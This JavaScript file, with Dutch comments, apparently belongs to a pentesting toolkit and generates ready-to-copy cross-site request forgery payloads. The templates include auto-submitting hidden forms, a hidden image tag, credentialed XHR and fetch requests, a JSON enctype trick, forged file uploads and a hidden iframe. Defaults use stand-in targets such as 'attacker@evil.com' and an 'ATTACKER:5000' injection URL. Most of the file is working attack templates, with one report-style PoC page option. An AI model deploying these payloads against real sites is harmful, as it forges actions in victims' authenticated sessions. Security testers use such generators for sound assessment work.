// Copyright (C) 2021 Jan-Karel Visser info@jan-karel.nl
// SPDX-License-Identifier: AGPL-3.0-or-later

/**
 * CSRF PoC Generator
 * client-side PoC building voor copy-pasta
 */

(function () {
  'use strict';

  var root = document.getElementById('csrf-generator');
  if (!root) return;

  function $(id) { return document.getElementById(id); }

  function esc(s) {
    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  function escAttr(s) {
    return s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  function copyText(text, btn) {
    navigator.clipboard.writeText(text).then(function () {
      var orig = btn.textContent;
      btn.textContent = 'Gekopieerd!';
      setTimeout(function () { btn.textContent = orig; }, 1200);
    });
  }

  function renderOutput(containerId, payloads) {
    var container = $(containerId);
    if (!container) return;
    var html = '';
    for (var i = 0; i < payloads.length; i++) {
      var p = payloads[i];
      html += '<div class="gen-block">';
      html += '<div class="gen-label">' + esc(p.label) + '</div>';
      html += '<div class="gen-query"><pre><code>' + esc(p.payload) + '</code></pre>';
      html += '<button class="btn-sm btn-copy" data-idx="' + i + '">Kopieer</button>';
      html += '</div></div>';
    }
    container.innerHTML = html;
    container.querySelectorAll('.btn-copy').forEach(function (btn) {
      btn.addEventListener('click', function () {
        copyText(payloads[parseInt(this.dataset.idx)].payload, this);
      });
    });
  }

  function parseFields(raw) {
    // Parse "key=value" per regel of "key=value&key2=value2"
    var fields = [];
    var lines = raw.replace(/&/g, '\n').split('\n');
    for (var i = 0; i < lines.length; i++) {
      var line = lines[i].trim();
      if (!line) continue;
      var eq = line.indexOf('=');
      if (eq === -1) {
        fields.push({ name: line, value: '' });
      } else {
        fields.push({ name: line.substring(0, eq), value: line.substring(eq + 1) });
      }
    }
    return fields;
  }

  $('csrf-gen-btn').addEventListener('click', function () {
    var action  = $('csrf-action').value || 'http://target/update';
    var method  = $('csrf-method').value || 'POST';
    var fieldsRaw = $('csrf-fields').value || 'username=admin\nemail=attacker@evil.com';
    var contentType = $('csrf-content-type').value || 'form';
    var cb      = $('csrf-callback').value || '';

    var fields = parseFields(fieldsRaw);
    var results = [];

    // -- Auto-submit HTML form --
    var hiddenInputs = '';
    for (var i = 0; i < fields.length; i++) {
      hiddenInputs += '  <input type="hidden" name="' + escAttr(fields[i].name) + '" value="' + escAttr(fields[i].value) + '" />\n';
    }
    results.push({
      label: 'Auto-submit HTML form',
      payload: '<!DOCTYPE html>\n<html>\n<head><title>Loading...</title></head>\n<body>\n' +
               '<form id="csrf" action="' + escAttr(action) + '" method="' + method + '">\n' +
               hiddenInputs +
               '  <noscript><input type="submit" value="Submit" /></noscript>\n' +
               '</form>\n' +
               '<script>document.getElementById("csrf").submit();</script>\n' +
               '</body>\n</html>',
    });

    // -- Via IB endpoint --
    var ibParams = 'action=' + encodeURIComponent(action) + '&method=' + method;
    for (var j = 0; j < fields.length; j++) {
      ibParams += '&' + encodeURIComponent(fields[j].name) + '=' + encodeURIComponent(fields[j].value);
    }
    results.push({
      label: 'Via IB — /csrf/inject.html',
      payload: (cb || 'http://ATTACKER:5000') + '/csrf/inject.html?' + ibParams,
    });

    // -- Image tag (GET only) --
    if (method === 'GET') {
      var qs = '';
      for (var k = 0; k < fields.length; k++) {
        qs += (k === 0 ? '?' : '&') + encodeURIComponent(fields[k].name) + '=' + encodeURIComponent(fields[k].value);
      }
      results.push({
        label: 'Image tag CSRF (GET)',
        payload: '<img src="' + escAttr(action) + qs + '" width="0" height="0" style="display:none" />',
      });
    }

    // -- XHR --
    var xhrBody;
    if (contentType === 'json') {
      var jsonObj = {};
      for (var m = 0; m < fields.length; m++) jsonObj[fields[m].name] = fields[m].value;
      xhrBody = JSON.stringify(jsonObj, null, 2);
    } else {
      var parts = [];
      for (var n = 0; n < fields.length; n++) {
        parts.push(encodeURIComponent(fields[n].name) + '=' + encodeURIComponent(fields[n].value));
      }
      xhrBody = parts.join('&');
    }

    var xhrCT = contentType === 'json' ? 'application/json' :
                contentType === 'multipart' ? 'multipart/form-data' :
                'application/x-www-form-urlencoded';

    results.push({
      label: 'XHR-based CSRF (' + xhrCT + ')',
      payload: '<script>\n' +
               'var xhr = new XMLHttpRequest();\n' +
               'xhr.open("' + method + '", "' + action + '", true);\n' +
               'xhr.withCredentials = true;\n' +
               'xhr.setRequestHeader("Content-Type", "' + xhrCT + '");\n' +
               'xhr.send(\'' + xhrBody.replace(/'/g, "\\'").replace(/\n/g, "\\n") + '\');\n' +
               '</script>',
    });

    // -- fetch-based --
    results.push({
      label: 'fetch-based CSRF (' + xhrCT + ')',
      payload: '<script>\n' +
               'fetch("' + action + '", {\n' +
               '  method: "' + method + '",\n' +
               '  credentials: "include",\n' +
               '  headers: {"Content-Type": "' + xhrCT + '"},\n' +
               '  body: \'' + xhrBody.replace(/'/g, "\\'").replace(/\n/g, "\\n") + '\',\n' +
               '});\n' +
               '</script>',
    });

    // -- JSON CSRF met form --
    if (contentType === 'json') {
      results.push({
        label: 'JSON CSRF via form — enctype trick',
        payload: '<!DOCTYPE html>\n<html>\n<body>\n' +
                 '<form id="csrf" action="' + escAttr(action) + '" method="POST" enctype="text/plain">\n' +
                 '  <input type="hidden" name=\'{"' + fields[0].name + '":"' + fields[0].value + '","ignore_me":"' + '\' value=\'"}\' />\n' +
                 '</form>\n' +
                 '<script>document.getElementById("csrf").submit();</script>\n' +
                 '</body>\n</html>\n\n' +
                 '-- Resultaat body: {"' + fields[0].name + '":"' + fields[0].value + '","ignore_me":"="}',
      });
    }

    // -- Multipart form --
    if (contentType === 'multipart') {
      var boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2, 15);
      var mpBody = '';
      for (var p = 0; p < fields.length; p++) {
        mpBody += '--' + boundary + '\\r\\n';
        mpBody += 'Content-Disposition: form-data; name="' + fields[p].name + '"\\r\\n\\r\\n';
        mpBody += fields[p].value + '\\r\\n';
      }
      mpBody += '--' + boundary + '--\\r\\n';

      results.push({
        label: 'Multipart CSRF via XHR',
        payload: '<script>\n' +
                 'var xhr = new XMLHttpRequest();\n' +
                 'xhr.open("POST", "' + action + '", true);\n' +
                 'xhr.withCredentials = true;\n' +
                 'xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=' + boundary + '");\n' +
                 'xhr.send("' + mpBody + '");\n' +
                 '</script>',
      });
    }

    // -- File upload CSRF --
    results.push({
      label: 'File upload CSRF',
      payload: '<!DOCTYPE html>\n<html>\n<body>\n' +
               '<form id="csrf" action="' + escAttr(action) + '" method="POST" enctype="multipart/form-data">\n' +
               hiddenInputs +
               '  <input type="file" name="file" id="fileInput" />\n' +
               '</form>\n' +
               '<script>\n' +
               '// Auto-submit met lege file of gesimuleerde data:\n' +
               'var dt = new DataTransfer();\n' +
               'dt.items.add(new File(["malicious content"], "payload.txt", {type: "text/plain"}));\n' +
               'document.getElementById("fileInput").files = dt.files;\n' +
               'document.getElementById("csrf").submit();\n' +
               '</script>\n' +
               '</body>\n</html>',
    });

    // -- iframe verborgen --
    results.push({
      label: 'Verborgen iframe CSRF',
      payload: '<!-- Onzichtbare iframe met auto-submit form -->\n' +
               '<iframe style="display:none" name="csrf_frame"></iframe>\n' +
               '<form id="csrf" action="' + escAttr(action) + '" method="' + method + '" target="csrf_frame">\n' +
               hiddenInputs +
               '</form>\n' +
               '<script>document.getElementById("csrf").submit();</script>',
    });

    // -- PoC link met confirmation --
    results.push({
      label: 'PoC pagina met uitleg (voor rapport)',
      payload: '<!DOCTYPE html>\n<html>\n<head><title>CSRF PoC</title></head>\n<body>\n' +
               '<h1>CSRF Proof of Concept</h1>\n' +
               '<p>Dit demonstreert een Cross-Site Request Forgery kwetsbaarheid op:<br>\n' +
               '<strong>' + esc(action) + '</strong></p>\n' +
               '<form id="csrf" action="' + escAttr(action) + '" method="' + method + '">\n' +
               hiddenInputs +
               '  <input type="submit" value="Click to trigger CSRF" />\n' +
               '</form>\n' +
               '</body>\n</html>',
    });

    renderOutput('csrf-gen-output', results);
  });
})();
